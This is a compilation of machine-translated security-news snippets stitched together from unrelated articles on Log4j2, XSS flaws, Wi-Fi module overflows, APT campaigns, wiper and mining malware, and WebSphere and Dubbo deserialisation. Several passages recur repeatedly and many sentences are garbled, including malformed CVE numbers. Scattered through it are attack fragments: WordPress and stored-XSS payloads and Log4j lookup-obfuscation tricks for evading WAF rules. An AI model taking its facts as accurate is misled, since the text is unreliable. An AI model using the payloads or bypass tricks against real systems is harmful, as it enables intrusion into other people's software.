Since the Apache Log4j2 remote code execution exploit does not require special configuration, and the attacker can exploit the vulnerability to execute the code remotely, so the enterprises applying Apache Log4j2 will face great harm and need to be fixed as soon as possible to avoid the harm caused by the vulnerability
Vulnerability Description: Apache Log4j2 is a Java-based logging tool, which rewrite the Log4j framework and introduces a lot of rich features. Apache log4j-2 is an upgraded version of Log4j. This logging framework is widely used in business system development to record log information
In most cases, the developer may write the error information caused by the user input into the log, and an attacker can use this feature to build a special data request package through the vulnerability, eventually triggering remote code execution
Cross-site scripting vulnerability (XSS) has been a classic Top 10 attack method of OWASP in recent years, and it is quite good to find XSS vulnerabilities in the wild, especially in some well-known network products
Recently, the US Target security team found a unique XSS vulnerability in SharePoint, an online Microsoft online service product, without any user interaction. The following is the sharing of the Target team
 However, it is SharePoints notification service that allows malicious attackers to exploit vulnerabilities discovered by the Target security team to inject malicious code into the victims browser by sending an email, automatically implementing XSS attacks without user interaction
The idea is to use the cache of a web browser to steal Wi-Fi passwords
When the client connects, dribble intercepts each HTTP request executed on the JavaScript page and injects malicious JavaScript code into the response
When the client is disconnected from the false access point and reconnects to the home router, the malicious JavaScript code activates, stealing the Wi-Fi password from the router and sending the password to the attacker

7012: " Network security researchers have found a new set of serious vulnerabilities in the Realtek RTL8170C Wi-Fi module that attackers can exploit to gain higher access on devices and hijack wireless communications
Successful attack will result in full control of the Wi-Fi module and potential root access on the operating system (Linux or Android) of the embedded device that uses the module
The survey was found in February, when analysis found similar weaknesses in the Realtek RTL8195A Wi-Fi module, the main one being the buffer overflow vulnerability (CVE-2020-9395), which allows attackers near the RTL8195 module to pass through the module without knowing the Wi-Fi network password
Similarly, the four-way handshake mechanism in the RTL8170C Wi-Fi module is vulnerable to two stack-based buffer overflow vulnerabilities (CVE-2020-20-27301 and CVE-2020-27-2302, CVSS score: 8.0) through which an attacker can remotely execute code on a WPA 2 client using this module
The researchers verified the PoC scenario of the vulnerability, posing as a legitimate access point and sending a malicious encryption group temporary key (GTK) to any client (aka the requester) connected to it via the WPA 2 protocol
Buffer overflow Buffer is a continuous area of computer memory that holds multiple instances of the same data type
More serious security vulnerabilities include the shock wave virus in August 2003, the openssl "Heartbleed" (Heart Blood drop) vulnerability reported in April 2014, and the glibc library ghost bug in January 2015

Malware can be divided into the following types: 01. Virus is the most widely spread malware. Virware is self-replicated malicious code that is attached or built into executable files to try to reduce user alertness
The virus can be transmitted via mail and hardware (USB secret keys and other external computer accessories)
02. Worms. Worms and viruses are often confused
Powerful worms are self-regulating, even self-repairing, and Stuxnet is the most striking example
A Trojan horse is a shield of malicious code
An important feature of trojans is that they can not be executed automatically and need to use the target victim to infect other applications
Spyware, ransomware, and keylogs viruses, worms, and Trojan horses are in the first category of malware in terms of transmission methods
For example, keystroke records, spyware, and ransomware are all transmitted through viruses, worms, or trojans

After tracing and correlation, it was found that the RAT is a mobile terminal weapon unique to the Molerats APT organization, which we named the GazaHT family
According to the Chinese naming method of Qianxin Threat Intelligence Center, we renamed the organization Moonlight Mouse
The Moonlight Rat group is from a region of the Middle East, mainly targeting Israel and the Palestinian region
The group launched a malware attack in October 2012, causing the police department to disconnect network access to all computers in the department for insurance
In 2013, foreign security manufacturer FireEye disclosed and named it Molerats; thereafter, the organization continued to launch multiple attacks, and was disclosed and named by many domestic and foreign security vendors, so it has multiple aliases (alias: Gaza Hackers Team, Gaza cybergang, Gaza Cybergang, Operation Molerats, Extreme Jackal, Moonlight, ALUMINUM SARATOGA)
Qi Anxin threat intelligence center mobile security team through tracking analysis found that: the moonlight mouse organization disguised as the chat application attack payload is mainly stored in the phishing website ephoneservices [. ] Club, although the phishing title says "high quality, safe and available on Google Play," downloads a malicious payload
The attacker can expand richer monitoring functions according to his own capabilities, and can easily control the control of the victim users phone by issuing instructions

7253: "0x00 preface" Citrix ADC and Citrix Gateway were exposed last month as having a serious vulnerability, numbered CVE-2019-19781
We focused on the vulnerability, which it is said that unauthenticated attackers can exploit itself to attack the target device
From this information, we know that the vulnerability point may be located in the / vpns / path, and may be a directory traversal vulnerability
So any script calling the csd function can trigger the path vulnerability
If this vulnerability alone, we had little room to play, but after seeing a Craig Yong article, we found it was possible to use Perl Template Toolkit to further exploit the vulnerability
To sum up, in order to exploit this vulnerability, we need to perform the following operations: 1. Find the way to execute Perl code through the template; 2. Use the path traversal vulnerability to write the constructed XML file to the template directory; 3. browse the uploaded XML file to trigger the template resolution
Since the vulnerability can affect many devices, MDSec decided not to disclose the available exploitation code for the vulnerability, but we found that some attackers are now using the vulnerability, so we thought it was necessary to disclose our research results so that others could take action

7256: " There are multiple serious vulnerabilities in the ABB System 800xA Distributed Control System (DCS), including vulnerabilities that can be used for remote code execution, denial of service attacks, and privilege enhancement
Knowles According to Security Week, attackers can exploit these vulnerabilities to cause a denial of service, or gain an initial foothold on the operators computer
Since security control systems are generally deployed in industrial environments, attackers cannot exploit these vulnerabilities to cause damage, but they can still cause interference
Knowles Explained that even if an attacker can break into the DCS system without additional work, he can only, for example, turn the system down, or modify some operations without, say, an explosion
One of the worst vulnerabilities was CVE-2020-8477
The vulnerability is a remote code execution vulnerability affecting the System 800xA Information Manager components
A remote attacker can exploit the vulnerability by inducing users to access a malicious Web site that does not require identity authentication
Not only System 800xA uses the affected license management system, but also Compact HMI, ControlBuilder Safe, Composer products, and other Ability products
7260: A security researcher who reportedly publicly disclosed a zero-day vulnerability in the Microsoft Windows mission planning program two months ago again released a new proof-of-concept code (PoC) on Tuesday (October 23)

Since 2012, the "destruction king" Shamoon has become a nightmare for the Persian Gulf oil majors
In 2019, the Shamoon cloud was not yet gone, and the destroyer ZeroCleare parachuted into the Middle East, adding another haze to the anxious Gulf
ZeroCleare Data Destroy Malware Yesterday, IBMs X-Force Incident Response and Intelligence Service (IRIS) released a new destructive data removal malware, ZeroCleare, which targets the maximum deletion of data from infected devices
IBM did not disclose the exact company under the attack, but could confirm that ZeroCleare is targeting the energy and industrial sectors in the Middle East, with preliminary estimates that 1,400 devices have been infected
Very similar to the previous Shamoon, ZeroCleare is used to perform destructive attacks, mainly to erase the primary boot records (MBR) and damage a large number of disk partitions on network devices, simply deleting data
Founded by APT 34 and xHunt, the IBM report also confirms that ZeroCleare and Shamoon, the disruptive malware, are created by top Iranian-funded hacking groups
Differently, Shamoon is derived from APT 33 tissue, while ZeroCleare is developed in collaboration between APT 34 (Oilrig) and Hive0081 (aka xHunt) organizations
According to available information, Irans hacking group APT 34 (Oilrig) has been targeting victims of the Middle East and internationally since at least 2014, focusing on important areas related to national security, including finance, government, energy, chemicals and telecommunications
Earlier this year, APT 34 (Oilrig) disguised itself as a Cambridge University official, using LinkedIn to transmit malicious files, conduct phishing attacks, and premeditated to steal important information
ZeroCleare Software unconventional strategy from the disclosure of the attack process, before the execution of ZeroCleare malicious program, hackers will first access the company network account with weak security through violent attacks, and when you get access to the company server account, you will use the SharePoint vulnerability to install China Chopper, Tunna and other Web Shell tools
As for the details of the attack, a legal toolkit called EldoS RawDisk has virtually helped push ZeroCleare
When it comes to data-destroying attacks, its easy to imagine that they first appeared in 2012 and still raged in the Middle East in 18, targeting similar malware Shamoon from Saudi Oil
(2012) Even in 2018, the variant Shamoon was targeted against overseas contractors, affecting nearly 400 servers and up to 100 personal computers, damaging the Saudi oil business
On the one hand, data erasure, as a combination of massive destruction, huge losses, long recovery time cost, and destructive characteristics, has always been called the worst attack method in the circle
Zero day inventory of typical national destructive network attacks in the past decade, found that pure data theft and secret monitoring have become an auxiliary means, and destructive malicious software such as Stuxnet, Shamoon and Dark Seoul, is increasingly used by hacker organizations with national background, and gradually develop to the conventional network weaponization
In 2010, The worlds first digital weapon Stuxnet shock net virus, America used its success in destroying enriched enriched centrifuges, The bankruptcy of Irans nuclear program; In 2012, In retaliation for the American shock net attack, Iran is using Shamoon malware, Almost completely destroyed data from 35,000 computers, And openly burning the American flag on the companys home page; In 2015, Black Energy Coming rival Ukraine, Attackers from Russia using open-source toolkits, Dineinto Ukrainian Energy, It eventually led to a nationwide power outage in Ukraine; Until recently, A new type of malicious data erase software ZeroCleare attack

The scp in OpenSSH 8.3p1 allows injecting commands into the scp.c remote function, and an attacker can exploit the vulnerability to execute arbitrary commands
This vulnerability is a command execution vulnerability, and most linux systems are currently affected
If we find the target users user name and password, and the target user closes ssh, but opens scp, then we can exploit this vulnerability to bounce back the shell to get permissions
7357 TeamTNT is a gang that mainly invaded online containers and profit from mining and DDoS
In early 2021, the gang was found to have hacked into a Kubernetes cluster, combining scripts and existing tools
And these clusters have objective network resources, naturally become the object of attackers covet
This paper will interpret the attack event against the Kubernetes cluster and the subsequent Trojan horse transmission events within the cluster, in order to present the attack mode of the network black production gang against the online cluster
Masscan Is a popular port scanning tool for scanning 10250 ports to discover other Kubelet in Kubernetes clusters that also have identity security issues
In this way, the attacker controlled all of the containers managed by the Kubelet, downloaded and executed malicious programs in the containers through the Kubelets command API, and eventually implanted the Monroe coin mining Trojan
Figure 2.3 Collecting System Information Figure 2.4 Collecting credentials For other containers, the attacker implanted an IRC Trojan to connect to a specific IRCC & C
The attacker implanted a malicious script, modified the / etc/ld.so.preload file, specified the homemade dynamic library, and ook the system function
So Kubernetes may yield more than Docker hosts, which reflects the trend when attackers invade online cloud platform containers
For victims, multiple online containers implanted with mining Trojan may lead to the depletion of host resources in the cluster, collapse and denial of service, and more serious data leakage

7409: In the current Internet security environment, spreading Emotet malware through malicious spam activities is the most common email-based security threat, far more than other malware families, and only a few of them
In recent weeks, researchers have discovered that more Emotet interactions use a technology called "thread hijacking" that can use and send messages stolen from email clients on infected devices and trick legitimate users by falsifying stolen email responses
The technology is much more efficient for relatively less complex ones, because it is more successful in convincing potential users to click on attachments, or click on links and download Word documents that contain malicious macros
These thread-hijacking messages will either contain attachment files or links to malicious Word documents, all intended to infect the target host with Emotet
The Emotet thread hijacking message is disguised as the same email address as the infected host email client, but the Header in the fake message can identify the true sender of the email, and we can find that the sender of the email is a zombie host located in Brazil: Reference

11081: In a recent Red Team exercise, we found a bug in the latest version of Symantec Management Agent (Altiris) that can be used to increase privileges
Folders with Everyone Full Control privileges are very interesting, but sometimes we struggle and may end up with nothing
We found that the permissions of the NSI directory are shown in the figure below, and these are consistent with the permissions of the Outbox directory: We then tried to use the James Forshaws symboliclink-testing-tools tool to redirect the directory to another location, create a mount point for another directory, and determine whether these files would be successfully written, which proved true
Here we may also have the option to use the junction tool in systernals
The James Forshaw toolset can help us make use of the existing directory, as shown in the figure below: Another tool can also be used in this attack scenario: Windowss own mklink.exe tool, but we need high permissions to use the tool, not suitable for the current scenario (now our purpose is to increase permissions)
To thoroughly clarify which process would override these permissions, we uploaded sysinternalss Process Monitor tool to observe the specific workflow in the background

Overview SFile, also known as Escal, first appeared in 2020, mainly for Windows platforms
Some varieties of the ransomware are also used to make the suffix name of the encrypted file attached with the English name of the target enterprise. For example, the variant captured this time uses nuctech-gj0okyci (nuctech is the English name of Tongfang Vision Technology Co., Ltd.) as the suffix name
1. Suggestions against SFile weak password attacks: Limit users who can use RDP and only authorize remote access to those who must use it for work

Therefore, under the WordPress defense system, how to bypass Nonce, how to obtain the super administrator permission, if any operation can threaten the website security operation under the non-super administrator permission, is the main direction of WordPress security vulnerabilities
After we are familiar with WordPresss security mechanism, lets go back to this vulnerability
In / wp-includes/formatting.php line 3025, the entire label is processed once, Without no additional escape, Plus it is done by stitching the double quotation symbols, So if we construct a comment as <a title= aa \ "onmouseover=alert () id= \" rel= 111> please click me and the property in the original please click me link are taken out, And then are wrapped in double quotes, <a title= \ "aa \" onmouseover=alert () id= \ "\" rel= 111> please click me malicious link is constructed, When the administrator places the mouse on this comment, Any JS can be performed
Core set a security standard by saying that there is only one part of the vulnerability that can actually count as a vulnerability, a WordPress XSS vulnerability that bypassed the Nonce mechanism
But in the meantime, recent spyware on Google Play has done considerable damage to fans of the wonderful World Cup
"Golden Cup" is a malicious application that would install spyware on a victims device
Captured data Golden Cup Capture large amounts of encrypted data from the victims device: Phone number installed package device model, manufacturer, internal storage capacity available with serial numbers available Device IDAndroid version IMEI, IMSI This spyware may only be in the first stage of greater infection activity because it has the ability to load a dex file from a remote source, the application connects to its control server and attempts to download, extract, and decrypt phase 2
Android/FoulGoal.A Check when the screen is on or closed and record it in its internal file scrn.txt, the strings "on" and "off" indicate that it is used to track the user viewing the screen: the communication channel between the device and the malicious server uses the message queue telemetry Transfer Protocol (MQTT) to send and receive commands
We believe that the malware authors use this AES encryption technology to upload all the information, which helps to avoid the detection of Google Bouncer and network detection products
11307: According to The Hacker News 2 on October 23, researchers have demonstrated a new type of PDF document attacks on the contents of the document, including replacing the payee, payment order or changing the terms of the contract
The attack technique is called a "shadow attack" by scholars at the Ruhr University of Bochum in Germany, and its main attack principle is the "view layer" concept, or different sets of content that overlap in PDF documents
Of the 29 PDF readers tested, 16 were vulnerable to shadow attacks- - -, including Adobe Acrobat, Foxit Reader, Perfect PDF, and Okular
The research team added that hiding and replacing are the most harmful variant attacks, as it can replace the content of the entire document
To test the attack, the researchers released two new open-source tools, PDF-Attacker and PDF-Detector
This shadow attack exploit was tracked and coded as CVE-2020-9592 and CVE-2020-9596, which Adobe addressed in an update released on May 12,2020

Later accidentally find another deserialization entry, Having confirming that it is impossible to focus on the historical loophole, Had to go from readObject, readExternal, toString, compare, etc., the functions to try to find, Later in a readObject found a JNDI injection, But due to the sdk high version, The only way you can be local factory or jndi local deserialization, But the WebSpheres public utilization chains are blocked, Local deserialization doesnt really work here, So all we left is the local Factory
The deserialization entrance is not given for the time being, and there may be many such deserialization entrance, and we happen to meet one of them. If we are lucky enough to find the RCE vulnerability, write out the entrance we found, and start with JNDI in that readObject

One is to study what methods can be used besides jndi; the second is to find what methods can divide payload features besides lower, upper, etc
Back to the two questions just now, first, study which other lookup can be used except jndi. In fact, only jndi can be used by injection, but other methods will still lead to some information leakage, such as main, env, sys and other methods
The second question is to study which lookup methods can be used to segment commands. The first thought is to combine the splicing of empty characters
One is that the case conversion is not necessarily the letters, After the next character will not report an error, If $ {lower::} and: is an output, $ {power: /} and / is also an output; The second is that some special characters become just like normal letters after passing through the loop or the upper, Those who have ctf experience should be familiar with this, For example, jnd ? (? (here \ \ u0131) is not the lowercase letter i (\ \ x69)), A special character passes up and becomes JNDI, Using these features can also bypass the preprocessing and interception of some waf rules

There are three main types of XSS: Type 1: Reflected XSS (also known as "non-persistent") server reads data directly from HTTP requests and reflects it back to the HTTP response
Type 2: The stored XSS (also known as a "persistence") application stores hazardous data in databases, message forums, visitor logs, or other trusted data storage devices
Type 3: DOM-based XSS In a DOM-based XSS, the client that injects the XSS into the page; in other types, the injection operations are performed by the server

11081: In a recent Red Team exercise, we found a bug in the latest version of Symantec Management Agent (Altiris) that can be used to increase privileges
Folders with Everyone Full Control privileges are very interesting, but sometimes we struggle and may end up with nothing
We found that the permissions of the NSI directory are shown in the figure below, and these are consistent with the permissions of the Outbox directory: We then tried to use the James Forshaws symboliclink-testing-tools tool to redirect the directory to another location, create a mount point for another directory, and determine whether these files would be successfully written, which proved true
Here we may also have the option to use the junction tool in systernals
The James Forshaw toolset can help us make use of the existing directory, as shown in the figure below: Another tool can also be used in this attack scenario: Windowss own mklink.exe tool, but we need high permissions to use the tool, not suitable for the current scenario (now our purpose is to increase permissions)
To thoroughly clarify which process would override these permissions, we uploaded sysinternalss Process Monitor tool to observe the specific workflow in the background

Therefore, under the WordPress defense system, how to bypass Nonce, how to obtain the super administrator permission, if any operation can threaten the website security operation under the non-super administrator permission, is the main direction of WordPress security vulnerabilities
After we are familiar with WordPresss security mechanism, lets go back to this vulnerability
In / wp-includes/formatting.php line 3025, the entire label is processed once, Without no additional escape, Plus it is done by stitching the double quotation symbols, So if we construct a comment as <a title= aa \ "onmouseover=alert () id= \" rel= 111> please click me and the property in the original please click me link are taken out, And then are wrapped in double quotes, <a title= \ "aa \" onmouseover=alert () id= \ "\" rel= 111> please click me malicious link is constructed, When the administrator places the mouse on this comment, Any JS can be performed
Core set a security standard by saying that there is only one part of the vulnerability that can actually count as a vulnerability, a WordPress XSS vulnerability that bypassed the Nonce mechanism
But in the meantime, recent spyware on Google Play has done considerable damage to fans of the wonderful World Cup
"Golden Cup" is a malicious application that would install spyware on a victims device
Captured data Golden Cup Capture large amounts of encrypted data from the victims device: Phone number installed package device model, manufacturer, internal storage capacity available with serial numbers available Device IDAndroid version IMEI, IMSI This spyware may only be in the first stage of greater infection activity because it has the ability to load a dex file from a remote source, the application connects to its control server and attempts to download, extract, and decrypt phase 2
Android/FoulGoal.A Check when the screen is on or closed and record it in its internal file scrn.txt, the strings "on" and "off" indicate that it is used to track the user viewing the screen: the communication channel between the device and the malicious server uses the message queue telemetry Transfer Protocol (MQTT) to send and receive commands
We believe that the malware authors use this AES encryption technology to upload all the information, which helps to avoid the detection of Google Bouncer and network detection products
11307: According to The Hacker News 2 on October 23, researchers have demonstrated a new type of PDF document attacks on the contents of the document, including replacing the payee, payment order or changing the terms of the contract
The attack technique is called a "shadow attack" by scholars at the Ruhr University of Bochum in Germany, and its main attack principle is the "view layer" concept, or different sets of content that overlap in PDF documents
Of the 29 PDF readers tested, 16 were vulnerable to shadow attacks- - -, including Adobe Acrobat, Foxit Reader, Perfect PDF, and Okular
The research team added that hiding and replacing are the most harmful variant attacks, as it can replace the content of the entire document
To test the attack, the researchers released two new open-source tools, PDF-Attacker and PDF-Detector
This shadow attack exploit was tracked and coded as CVE-2020-9592 and CVE-2020-9596, which Adobe addressed in an update released on May 12,2020

Then I looked at the patch, and sure enough, I regretted that I was going to find an RCE vulnerability and submit the XXE vulnerability together, because I was afraid of submitting the XXE official blocked the reverse serialized entrance, such as CVE-2020-4450, and directly blocked the reverse serialized entrance
WebSphere Analysis seems to be very little, talk about a few analysis, not like Weblogic production vulnerabilities, single is a high version sdk will intercept a lot of chain or connection available chain of the point, thought and rotten in hand, it is better to share, write down we found the process, actually important is not the XXE, but to XXE in the first half of this point
In order to be more familiar with WebSphere, we also went to the historical patch. For example, the deep impression is CVE-2020-4276, which is the historical vulnerability CVE-2015-7450, and the process of RCE is no different from CVE-2015-7450
Later accidentally find another deserialization entry, Having confirming that it is impossible to focus on the historical loophole, Had to go from readObject, readExternal, toString, compare, etc., the functions to try to find, Later in a readObject found a JNDI injection, But due to the sdk high version, The only way you can be local factory or jndi local deserialization, But the WebSpheres public utilization chains are blocked, Local deserialization doesnt really work here, So all we left is the local Factory
The deserialization entrance is not given for the time being, and there may be many such deserialization entrance, and we happen to meet one of them. If we are lucky enough to find the RCE vulnerability, write out the entrance we found, and start with JNDI in that readObject

This article focuses on how to identify and intercept attack requests at the traffic level to achieve the purpose of accurate detection and protection
One is to study what methods can be used besides jndi; the second is to find what methods can divide payload features besides lower, upper, etc
Back to the two questions just now, first, study which other lookup can be used except jndi. In fact, only jndi can be used by injection, but other methods will still lead to some information leakage, such as main, env, sys and other methods
The second question is to study which lookup methods can be used to segment commands. The first thought is to combine the splicing of empty characters
One is that the case conversion is not necessarily the letters, After the next character will not report an error, If $ {lower::} and: is an output, $ {power: /} and / is also an output; The second is that some special characters become just like normal letters after passing through the loop or the upper, Those who have ctf experience should be familiar with this, For example, jnd ? (? (here \ \ u0131) is not the lowercase letter i (\ \ x69)), A special character passes up and becomes JNDI, Using these features can also bypass the preprocessing and interception of some waf rules

Dububo was found to have a remote code execution vulnerability of CVE-2020-1948, and the new version of Dubbo2.7.7 found that the repair method could not prevent the exploitation of CVE-2020-1948 vulnerability
0x03 Vulnerability Analysis CVE-2020-1948 Remote code execution vulnerability principle is the code execution caused by the remote method to be dynamically called
The vulnerability trigger principle of Dubbo is the code execution caused by the method of dynamically calling external incoming objects inside the toStringBean class
The vulnerability trigger point of dubbo is different from fastjson. fastjson uses this chain to cause code execution because the setAutoCommit method uses the this.connect() method, and the connect() method can use the jndi method to load malicious classes to cause code execution
Recently, the Green Alliance Technology volt Shadow Lab has captured a number of phishing documents and related Trojan horse programs called "TBS TV_Qs.doc"

lzssdec The tool can be used to get a pure version of the binary kernel: $ lzssdec-o 0x1b6 <kernelcache.release.iphone7> kernelcache.bin$ file kernelcache.binkernelcache.bin: Mach-O 64-bit arm64 executable, Flags: <NOUNDEFS | PIE> Now we have two kernel binaries, We can start out with the diffing
In this way, we can put the data of interest in the kernel buffer, and we may leak this data in the future! The trick of being able to read part of the ipc _ port pointer is to send the first message containing X mach _ msg _ port _ descriptor _ t, release it, and then send another message with X y mach _ msg _ port _ descriptor _ t to reuse the assignment and write its trailer to the location of the previous message descriptor
10823: " a, background tendril flower (APT-C-08) APT organization is a long-term against China, Pakistan and other countries to attack APT organization, mainly attack the government, power and military industry related units, in order to steal sensitive information, has a strong political background, is currently active for domestic target attack one of the overseas APT organization
In August 2019,360 Fiberhome Laboratory found a new Android Trojan in the daily sample analysis, and named it SlideRAT according to its CC characteristics. After in-depth analysis, it was found that the family Trojan belongs to the organization

2. What is the cache penetration attack attacker constructs a certain amount (this is often 1 to several orders of magnitude less than the normal system) there is no data query in the system, resulting in a large number of requests cache penetration, resulting in the system slow or even crash
For the system without cache penetration defense, a malicious attacker can realize cache penetration as long as he changes the commodity ID parameter on the URL to a non-existing value. If a certain amount of such request is constructed at the same time, it can achieve the effect of making the target system refuse service
The router model of trying to save bricks is: LinkSys wrt54g v8CPU model is: BCM5354Flash model is: K8D6316UBM first obtained the order of jtag interface on the device through jtagulator

10832: Shadowsocks (SS) is a scientific Internet tool, based on the Socks5 agent encryption transmission protocol, but in recent years with the increasing GFW wall, some Shadowsocks traffic can be well identified
An attacker can use the modified packet to "redirect" to make MITM attacks
Although the underlying shadowsocks-py,shadowsocoks-go,shadowsocoks-nodejs.socks5 protocol base is SOCKS5, for this article, the underlying SOCKS5 is not the focus. We only need to pay attention to how the Shadowsocks client and the server transmit data
If an attacker wants to send an SMS message to the target user, he can use proxy tools to grab HTTP requests (for example, Burp Suite)
The normal search process is as follows, the attacker searches the pwned string: 0x02 attack scenario. At this time we have two different defects: if the victim clicks on the link we sent, he can execute the JavaScript code (refer to the previous "SMS link fraud"), and the redirected attack (refer to the previous "domain name regular verification"), redirect the user to a malicious site, execute the JavaScript code, and send the request to TikTok using the victim cookie
Due to the lack of defense mechanism against CSRF attacks, we can execute JavaScript code and perform various operations without the permission of the victim

The reason for this vulnerability is that the source origin is not checked. A simple attack scenario is that the attacker opens a new tab from the Gmail page and injects Payload into the tab with the postMessage method
So for attackers, to take advantage of this kind of vulnerability, so the first randomness of the channel name (Channel Name) is hard to determine, but in 2012 have security researchers had the message mechanism of random number generation method Math.random(), and found in the Facebook API XSS vulnerability, however, the vulnerability use need to share in web across domain random number generator (random generator) status

Overview SFile, also known as Escal, first appeared in 2020, mainly for Windows platforms
Some varieties of the ransomware are also used to make the suffix name of the encrypted file attached with the English name of the target enterprise. For example, the variant captured this time uses nuctech-gj0okyci (nuctech is the English name of Tongfang Vision Technology Co., Ltd.) as the suffix name
1. Suggestions against SFile weak password attacks: Limit users who can use RDP and only authorize remote access to those who must use it for work

Therefore, under the WordPress defense system, how to bypass Nonce, how to obtain the super administrator permission, if any operation can threaten the website security operation under the non-super administrator permission, is the main direction of WordPress security vulnerabilities
After we are familiar with WordPresss security mechanism, lets go back to this vulnerability
In / wp-includes/formatting.php line 3025, the entire label is processed once, Without no additional escape, Plus it is done by stitching the double quotation symbols, So if we construct a comment as <a title= aa \ "onmouseover=alert () id= \" rel= 111> please click me and the property in the original please click me link are taken out, And then are wrapped in double quotes, <a title= \ "aa \" onmouseover=alert () id= \ "\" rel= 111> please click me malicious link is constructed, When the administrator places the mouse on this comment, Any JS can be performed
Core set a security standard by saying that there is only one part of the vulnerability that can actually count as a vulnerability, a WordPress XSS vulnerability that bypassed the Nonce mechanism
But in the meantime, recent spyware on Google Play has done considerable damage to fans of the wonderful World Cup
"Golden Cup" is a malicious application that would install spyware on a victims device
Captured data Golden Cup Capture large amounts of encrypted data from the victims device: Phone number installed package device model, manufacturer, internal storage capacity available with serial numbers available Device IDAndroid version IMEI, IMSI This spyware may only be in the first stage of greater infection activity because it has the ability to load a dex file from a remote source, the application connects to its control server and attempts to download, extract, and decrypt phase 2
Android/FoulGoal.A Check when the screen is on or closed and record it in its internal file scrn.txt, the strings "on" and "off" indicate that it is used to track the user viewing the screen: the communication channel between the device and the malicious server uses the message queue telemetry Transfer Protocol (MQTT) to send and receive commands
We believe that the malware authors use this AES encryption technology to upload all the information, which helps to avoid the detection of Google Bouncer and network detection products
11307: According to The Hacker News 2 on October 23, researchers have demonstrated a new type of PDF document attacks on the contents of the document, including replacing the payee, payment order or changing the terms of the contract
The attack technique is called a "shadow attack" by scholars at the Ruhr University of Bochum in Germany, and its main attack principle is the "view layer" concept, or different sets of content that overlap in PDF documents
Of the 29 PDF readers tested, 16 were vulnerable to shadow attacks- - -, including Adobe Acrobat, Foxit Reader, Perfect PDF, and Okular
The research team added that hiding and replacing are the most harmful variant attacks, as it can replace the content of the entire document
To test the attack, the researchers released two new open-source tools, PDF-Attacker and PDF-Detector
This shadow attack exploit was tracked and coded as CVE-2020-9592 and CVE-2020-9596, which Adobe addressed in an update released on May 12,2020

Among them, DDoS attack and Web application attack are two two prominent security threats facing the Internet today
From the point of view of attack means and attack purpose, the two are completely different, but they are often not independent of each other, but closely related. It can be simply considered that DDoS attack and Web application attack are in different links in the attack chain, and botnet (Botnet) is the "bridge" between the two
But many attackers are not just content with this. They often plant Botnet malicious programs and build their own army of botnets

In order to be more familiar with WebSphere, we also went to the historical patch. For example, the deep impression is CVE-2020-4276, which is the historical vulnerability CVE-2015-7450, and the process of RCE is no different from CVE-2015-7450
Later accidentally find another deserialization entry, Having confirming that it is impossible to focus on the historical loophole, Had to go from readObject, readExternal, toString, compare, etc., the functions to try to find, Later in a readObject found a JNDI injection, But due to the sdk high version, The only way you can be local factory or jndi local deserialization, But the WebSpheres public utilization chains are blocked, Local deserialization doesnt really work here, So all we left is the local Factory
The deserialization entrance is not given for the time being, and there may be many such deserialization entrance, and we happen to meet one of them. If we are lucky enough to find the RCE vulnerability, write out the entrance we found, and start with JNDI in that readObject

After finding a storage XSS vulnerability in the name and having registered an account, I started testing, and soon I found that there was a storage XSS vulnerability in the account name and company name field area
The problem here is that in the link page generated by this file request, the user name or company name segment is unfiltered to achieve XSS Payload trigger, if XSS Payload- <script> alert is added ( Hi there!); </ script> After sending the corresponding file request link to other users, when the link is opened, XSS is executed, as follows: That is, we can execute any code in the target users system and do some bad things, but how can we take advantage of it? The encryption service uses client asymmetric encryption to protect user files. Since the encryption service is deployed in the form of a website, its encryption mechanism should be implemented by JavaScript call, that is to say, the local private key information can be obtained through JavaScript

This article focuses on how to identify and intercept attack requests at the traffic level to achieve the purpose of accurate detection and protection
One is to study what methods can be used besides jndi; the second is to find what methods can divide payload features besides lower, upper, etc
Back to the two questions just now, first, study which other lookup can be used except jndi. In fact, only jndi can be used by injection, but other methods will still lead to some information leakage, such as main, env, sys and other methods
The second question is to study which lookup methods can be used to segment commands. The first thought is to combine the splicing of empty characters
One is that the case conversion is not necessarily the letters, After the next character will not report an error, If $ {lower::} and: is an output, $ {power: /} and / is also an output; The second is that some special characters become just like normal letters after passing through the loop or the upper, Those who have ctf experience should be familiar with this, For example, jnd ? (? (here \ \ u0131) is not the lowercase letter i (\ \ x69)), A special character passes up and becomes JNDI, Using these features can also bypass the preprocessing and interception of some waf rules

Dubbo is an open source RPC service framework of Alibaba, which is often used to call distributed service remote objects. Dububo was found to have a remote code execution vulnerability of CVE-2020-1948, and the new version of Dubbo2.7.7 found that the repair method could not prevent the exploitation of CVE-2020-1948 vulnerability
0x03 Vulnerability Analysis CVE-2020-1948 Remote code execution vulnerability principle is the code execution caused by the remote method to be dynamically called
The vulnerability trigger principle of Dubbo is the code execution caused by the method of dynamically calling external incoming objects inside the toStringBean class
The vulnerability trigger point of dubbo is different from fastjson. fastjson uses this chain to cause code execution because the setAutoCommit method uses the this.connect() method, and the connect() method can use the jndi method to load malicious classes to cause code execution
Recently, the Green Alliance Technology volt Shadow Lab has captured a number of phishing documents and related Trojan horse programs called "TBS TV_Qs.doc"
According to the analysis, this series of malicious files are all part of the recent cyber attack activities organized by the APT organization Kimsuky, and their direct target is likely to be the military experts responsible for the Korean Peninsula issue

Folders with Everyone Full Control privileges are very interesting, but sometimes we struggle and may end up with nothing
We found that the permissions of the NSI directory are shown in the figure below, and these are consistent with the permissions of the Outbox directory: We then tried to use the James Forshaws symboliclink-testing-tools tool to redirect the directory to another location, create a mount point for another directory, and determine whether these files would be successfully written, which proved true
Here we may also have the option to use the junction tool in systernals
The James Forshaw toolset can help us make use of the existing directory, as shown in the figure below: Another tool can also be used in this attack scenario: Windowss own mklink.exe tool, but we need high permissions to use the tool, not suitable for the current scenario (now our purpose is to increase permissions)

In / wp-includes/formatting.php line 3025, the entire label is processed once, Without no additional escape, Plus it is done by stitching the double quotation symbols, So if we construct a comment as <a title= aa \ "onmouseover=alert () id= \" rel= 111> please click me and the property in the original please click me link are taken out, And then are wrapped in double quotes, <a title= \ "aa \" onmouseover=alert () id= \ "\" rel= 111> please click me malicious link is constructed, When the administrator places the mouse on this comment, Any JS can be performed
Core set a security standard by saying that there is only one part of the vulnerability that can actually count as a vulnerability, a WordPress XSS vulnerability that bypassed the Nonce mechanism
But in the meantime, recent spyware on Google Play has done considerable damage to fans of the wonderful World Cup
"Golden Cup" is a malicious application that would install spyware on a victims device
Captured data Golden Cup Capture large amounts of encrypted data from the victims device: Phone number installed package device model, manufacturer, internal storage capacity available with serial numbers available Device IDAndroid version IMEI, IMSI This spyware may only be in the first stage of greater infection activity because it has the ability to load a dex file from a remote source, the application connects to its control server and attempts to download, extract, and decrypt phase 2
